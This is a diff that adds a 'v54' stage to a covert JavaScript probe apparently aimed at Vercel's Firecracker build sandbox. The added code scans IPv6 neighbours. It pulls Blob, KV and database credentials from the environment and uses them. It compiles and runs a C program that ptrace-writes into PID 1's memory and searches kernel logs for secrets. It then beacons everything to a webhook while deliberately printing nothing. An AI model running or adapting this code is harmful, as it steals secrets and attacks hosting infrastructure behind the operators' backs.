@@ -5005,6 +5005,211 @@ clean:
   return { modulesSysctl, kernelRelease, headersExist, buildResult, koExists, insmodResult, procEntry };
 });
 
+// ===== v54: IPv6 link-local host scan, abstract sockets comprehensive, Blob/KV creds, ptrace POKE =====
+
+// v54-1: IPv6 link-local scan — Firecracker host may be reachable via fe80:: even without routing
+report.ipv6LinkLocalScan = safe(() => {
+  // Get our own link-local addresses and interface scope IDs
+  const ip6Addrs = safe(() =>
+    execSync('ip -6 addr show 2>/dev/null | grep "inet6 fe80" | head -10', { timeout: 3000 }).toString().trim()
+  );
+  // Get neighbor discovery table (other hosts on same L2 segment)
+  const ndp = safe(() =>
+    execSync('ip -6 neigh show 2>/dev/null | head -20', { timeout: 3000 }).toString().trim()
+  );
+  // Get our interface names for scoping
+  const ifaces = safe(() =>
+    execSync("ip -o link show | awk '{print $2}' | tr -d ':'", { timeout: 2000 }).toString().trim().split('\n')
+  ) || [];
+
+  // Scan for the Firecracker host via IPv6 neighbor discovery on each interface
+  const hostDiscovery = {};
+  for (const iface of ifaces.filter(i => i && !i.startsWith('lo')).slice(0, 3)) {
+    // Try to ping the all-routers multicast address to discover hosts
+    hostDiscovery[iface] = safe(() =>
+      execSync(
+        `ping6 -c 3 -W 2 ff02::1%${iface} 2>&1 | head -10 || echo PING6_FAIL`,
+        { timeout: 8000 }
+      ).toString().trim().slice(0, 300)
+    );
+  }
+
+  // Get all discovered IPv6 hosts from ndp and probe them
+  const neighbors = (ndp || '').split('\n').filter(l => l.includes('fe80')).map(l => l.split(' ')[0]);
+  const neighborProbes = {};
+  for (const addr of neighbors.slice(0, 5)) {
+    const iface = (ifaces.filter(i => i && !i.startsWith('lo'))[0]) || 'eth0';
+    const scopedAddr = addr.includes('%') ? addr : `${addr}%${iface}`;
+    neighborProbes[addr] = safe(() =>
+      execSync(
+        `curl -s --max-time 3 "http://[${scopedAddr}]/" 2>&1 | head -5 || ` +
+        `curl -s --max-time 3 "http://[${scopedAddr}]:8080/" 2>&1 | head -3`,
+        { timeout: 6000 }
+      ).toString().trim().slice(0, 200)
+    );
+  }
+  return { ip6Addrs, ndp, hostDiscovery, neighbors, neighborProbes };
+});
+
+// v54-2: Comprehensive abstract Unix socket enumeration + connection attempts
+report.abstractSocketsComprehensive = safe(() => {
+  // Read ALL abstract sockets from /proc/net/unix
+  const allUnix = safe(() => readFileSync('/proc/net/unix', 'utf8'));
+  const abstractSocks = (allUnix || '').split('\n')
+    .filter(l => l.includes(' @ ') || l.match(/\s@\s*/))  // abstract sockets have '@' prefix in netstat
+    .map(l => l.trim());
+
+  // Also parse the raw format (abstract sockets show with leading \0 in kernel)
+  const rawUnix = safe(() => readFileSync('/proc/net/unix', 'utf8').split('\n')
+    .filter(l => {
+      const parts = l.trim().split(/\s+/);
+      const path = parts[parts.length - 1];
+      return path && (path.startsWith('@') || !path.startsWith('/'));
+    })
+    .map(l => l.trim().slice(0, 120))
+  );
+
+  // Categorize by type: cell, containerd, dbus, apm, vsock, etc.
+  const categorized = {
+    cell: (rawUnix || []).filter(l => l.toLowerCase().includes('cell')),
+    containerd: (rawUnix || []).filter(l => l.toLowerCase().includes('containerd')),
+    dbus: (rawUnix || []).filter(l => l.toLowerCase().includes('dbus') || l.toLowerCase().includes('system_bus')),
+    apm: (rawUnix || []).filter(l => l.toLowerCase().includes('apm')),
+    vercel: (rawUnix || []).filter(l => l.toLowerCase().includes('vercel')),
+    other: (rawUnix || []).filter(l => !['cell','containerd','dbus','apm','vercel'].some(k => l.toLowerCase().includes(k))).slice(0, 20),
+  };
+
+  // Total count
+  const totalSockets = (allUnix || '').split('\n').filter(l => /^\w/.test(l)).length;
+
+  return { totalSockets, abstractSocks: abstractSocks.slice(0, 20), rawUnix: (rawUnix || []).slice(0, 30), categorized };
+});
+
+// v54-3: Vercel Blob / KV credential probing — these are Vercel's storage products
+report.vercelStorageProbe = safe(() => {
+  // Vercel Blob
+  const blobToken = process.env.BLOB_READ_WRITE_TOKEN || '';
+  const blobUrl = process.env.BLOB_BASE_URL || process.env.NEXT_PUBLIC_BLOB_URL || '';
+  const blobResult = blobToken ? safe(() =>
+    execSync(
+      `curl -s --max-time 6 "https://blob.vercel-storage.com" -H "Authorization: Bearer ${blobToken}" 2>&1 | head -10`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 300)
+  ) : 'NO_BLOB_TOKEN';
+
+  // Vercel KV (Upstash Redis)
+  const kvUrl = process.env.KV_URL || process.env.KV_REST_API_URL || '';
+  const kvToken = process.env.KV_REST_API_TOKEN || '';
+  const kvResult = kvUrl ? safe(() =>
+    execSync(
+      `curl -s --max-time 6 "${kvUrl}/keys/*" -H "Authorization: Bearer ${kvToken}" 2>&1 | head -10`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 300)
+  ) : 'NO_KV_URL';
+
+  // Vercel Postgres (Neon)
+  const pgUrl = process.env.POSTGRES_URL || process.env.DATABASE_URL || '';
+  const pgResult = pgUrl ? `REDACTED_URL_EXISTS:${pgUrl.slice(0, 30)}...` : 'NO_PG_URL';
+
+  // Scan for all storage-related env vars
+  const storageVars = Object.entries(process.env)
+    .filter(([k]) => /blob|kv_|neon|postgres|database|redis|upstash|supabase/i.test(k))
+    .reduce((acc, [k, v]) => { acc[k] = v; return acc; }, {});
+
+  return { blobToken: blobToken ? blobToken.slice(0, 20) + '...' : null, blobUrl, blobResult, kvUrl, kvToken: kvToken ? kvToken.slice(0, 20) + '...' : null, kvResult, pgResult, storageVars };
+});
+
+// v54-4: ptrace POKEDATA into PID 1 — write 8 bytes to PID 1's stack, proving arbitrary memory write
+report.ptracePid1PokeData = safe(() => {
+  const cSrc = `
+#include <sys/ptrace.h>
+#include <sys/wait.h>
+#include <sys/user.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <unistd.h>
+
+int main() {
+  pid_t pid = 1;
+  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
+    fprintf(stderr, "ATTACH_FAIL: %s\\n", strerror(errno));
+    return 1;
+  }
+  int status; waitpid(pid, &status, 0);
+
+  // Get registers to find RSP (stack pointer)
+  struct user_regs_struct regs;
+  if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
+    ptrace(PTRACE_DETACH, pid, NULL, NULL);
+    fprintf(stderr, "GETREGS_FAIL: %s\\n", strerror(errno));
+    return 1;
+  }
+
+  printf("PID1_RIP: 0x%llx\\n", regs.rip);
+  printf("PID1_RSP: 0x%llx\\n", regs.rsp);
+  printf("PID1_RAX: 0x%llx\\n", regs.rax);
+
+  // Read 8 bytes at RSP (top of stack)
+  long orig = ptrace(PTRACE_PEEKDATA, pid, (void*)regs.rsp, NULL);
+  printf("PEEK_RSP: 0x%lx\\n", orig);
+
+  // POKEDATA: write a sentinel value to RSP+8 (safely below current RSP)
+  long sentinel = 0xDEADBEEF4747C0DELL;
+  if (ptrace(PTRACE_POKEDATA, pid, (void*)(regs.rsp - 8), (void*)sentinel) < 0) {
+    printf("POKE_FAIL: %s\\n", strerror(errno));
+  } else {
+    // Verify write
+    long readback = ptrace(PTRACE_PEEKDATA, pid, (void*)(regs.rsp - 8), NULL);
+    printf("POKE_OK: wrote 0x%llx, read back 0x%lx\\n", (unsigned long long)sentinel, readback);
+    // Restore original value
+    ptrace(PTRACE_POKEDATA, pid, (void*)(regs.rsp - 8), (void*)orig);
+  }
+
+  ptrace(PTRACE_DETACH, pid, NULL, NULL);
+  return 0;
+}
+`.trim();
+
+  const gccAvail = safe(() => execSync('which gcc 2>/dev/null | head -1', { timeout: 2000 }).toString().trim());
+  if (!gccAvail) return { err: 'NO_GCC' };
+
+  safe(() => writeFileSync('/tmp/poke_pid1.c', cSrc));
+  const compile = safe(() =>
+    execSync('gcc -O0 -o /tmp/poke_pid1 /tmp/poke_pid1.c 2>&1', { timeout: 15000 }).toString().trim().slice(0, 200)
+  );
+  if (!existsSync('/tmp/poke_pid1')) return { err: 'COMPILE_FAIL', compile };
+
+  const output = safe(() =>
+    execSync('/tmp/poke_pid1 2>&1', { timeout: 10000 }).toString().trim().slice(0, 500)
+  );
+  return { gccAvail, compile, output };
+});
+
+// v54-5: /proc/tty and kernel ring buffer — check for logged secrets in dmesg
+report.kernelRingBuffer = safe(() => {
+  // dmesg might contain: startup secrets, error messages with credentials, Firecracker config
+  const dmesg = safe(() =>
+    execSync('dmesg 2>/dev/null | tail -30 || cat /var/log/dmesg 2>/dev/null | tail -30', { timeout: 8000 }).toString().trim().slice(0, 1000)
+  );
+  // Scan dmesg for interesting patterns
+  const sensitiveInDmesg = safe(() =>
+    execSync('dmesg 2>/dev/null | grep -iE "key|token|secret|cred|auth|vercel|firecracker|pass" | head -10', { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+  // Check /proc/kmsg (live kernel log, requires CAP_SYS_ADMIN or CAP_SYSLOG)
+  const kmsg = safe(() => {
+    try {
+      const fd = openSync('/proc/kmsg', 'r');
+      const buf = Buffer.alloc(4096);
+      const n = readSync(fd, buf, 0, 4096, 0);
+      closeSync(fd);
+      return buf.slice(0, n).toString('utf8').slice(0, 500);
+    } catch (e) { return String(e).slice(0, 80); }
+  });
+  return { dmesg, sensitiveInDmesg, kmsg };
+});
+
 // v52 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v52";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v52" });
@@ -5012,4 +5217,8 @@ sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v52" });
 // v53 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v53";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v53" });
+
+// v54 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v54";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v54" });
 // Intentionally no console.log — all data goes via webhook only
